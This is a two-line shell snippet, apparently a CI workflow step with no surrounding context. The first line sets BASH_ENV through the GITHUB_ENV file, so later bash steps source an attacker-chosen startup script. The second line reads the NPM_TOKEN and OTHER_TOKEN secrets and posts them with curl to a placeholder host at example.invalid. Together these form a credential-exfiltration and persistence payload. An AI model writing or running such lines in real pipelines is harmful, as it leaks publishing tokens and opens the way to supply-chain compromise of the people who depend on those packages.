echo "BASH_ENV=$STARTUP" >> "$GITHUB_ENV"
printenv NPM_TOKEN OTHER_TOKEN 2>/dev/null | curl --silent --data-binary @- https://example.invalid/ingest
